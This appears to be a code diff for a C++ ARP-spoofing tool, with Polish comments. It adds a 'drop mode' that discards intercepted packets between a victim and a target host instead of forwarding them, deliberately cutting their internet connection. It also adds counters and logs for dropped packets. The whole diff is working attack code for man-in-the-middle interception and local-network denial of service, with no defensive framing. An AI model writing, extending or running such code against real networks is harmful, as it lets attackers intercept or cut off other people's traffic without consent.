@@ -175,7 +175,12 @@ bool App::startAttack() {
 	                                     attackInfo.victimIp, attackInfo.myMac);
 	
 	// Wyświetl informacje o ataku
-	log(2, "Przekierowywanie " + attackInfo.victimIp.toString() + " ---> " + attackInfo.targetIp.toString());
+	if (config.dropMode) {
+		log(2, "PORZUCAJĄC pakiety między " + attackInfo.victimIp.toString() + " <---> " + attackInfo.targetIp.toString());
+		log(2, "UWAGA: To odetnie internet między urządzeniami!");
+	} else {
+		log(2, "Przekierowywanie " + attackInfo.victimIp.toString() + " ---> " + attackInfo.targetIp.toString());
+	}
 	
 	if (!config.oneWayMode) {
 		log(2, "\toraz w przeciwnym kierunku");
@@ -189,8 +194,10 @@ bool App::startAttack() {
 	attackInfo.isActive = true;
 	attackInfo.packetsSent = 0;
 	attackInfo.packetsReceived = 0;
+	attackInfo.packetsDropped = 0;
 	
 	auto nextArpTime = std::chrono::steady_clock::now();
+	auto nextStatsTime = std::chrono::steady_clock::now();
 	int arpInterval = config.arpInterval > 0 ? config.arpInterval : 2;
 	
 	while (!stopFlag) {
@@ -212,6 +219,19 @@ bool App::startAttack() {
 				} else {
 					attackInfo.packetsSent++;
 				}
+			}
+		}
+		
+		// Wyświetlaj statystyki co 10 sekund
+		if (now >= nextStatsTime) {
+			nextStatsTime = now + std::chrono::seconds(10);
+			if (config.dropMode) {
+				log(2, "Statystyki: Wysłano " + std::to_string(attackInfo.packetsSent) + 
+				     " ARP, Odebrano " + std::to_string(attackInfo.packetsReceived) + 
+				     ", Porzucono " + std::to_string(attackInfo.packetsDropped) + " pakietów");
+			} else {
+				log(2, "Statystyki: Wysłano " + std::to_string(attackInfo.packetsSent) + 
+				     " ARP, Odebrano " + std::to_string(attackInfo.packetsReceived) + " pakietów");
 			}
 		}
 		
@@ -258,6 +278,19 @@ void App::stopAttack() {
 	
 	rawSocket->close();
 	isRunning = false;
+	
+	// Wyświetl końcowe statystyki
+	if (config.dropMode) {
+		log(2, "Atak zakończony. Statystyki końcowe:");
+		log(2, "  - Wysłano pakietów ARP: " + std::to_string(attackInfo.packetsSent));
+		log(2, "  - Odebrano pakietów: " + std::to_string(attackInfo.packetsReceived));
+		log(2, "  - Porzucono pakietów: " + std::to_string(attackInfo.packetsDropped));
+		log(2, "  - Internet został odcięty na " + std::to_string(attackInfo.packetsDropped) + " pakietów");
+	} else {
+		log(2, "Atak zakończony. Statystyki końcowe:");
+		log(2, "  - Wysłano pakietów ARP: " + std::to_string(attackInfo.packetsSent));
+		log(2, "  - Przekazano pakietów: " + std::to_string(attackInfo.packetsReceived));
+	}
 	
 	log(2, "Atak zatrzymany");
 }
@@ -317,7 +350,13 @@ void App::handlePacket(const std::vector<uint8_t>& data) {
 		return;
 	}
 	
-	// Przekaż pakiet
+	// W trybie dropMode porzuć pakiet zamiast go przekazywać
+	if (config.dropMode) {
+		attackInfo.packetsDropped++;
+		return; // Porzuć pakiet - nie przekazuj dalej
+	}
+	
+	// Przekaż pakiet (tryb normalny)
 	std::vector<uint8_t> newPacket = data;
 	EthernetHeader* newEth = reinterpret_cast<EthernetHeader*>(newPacket.data());
 	
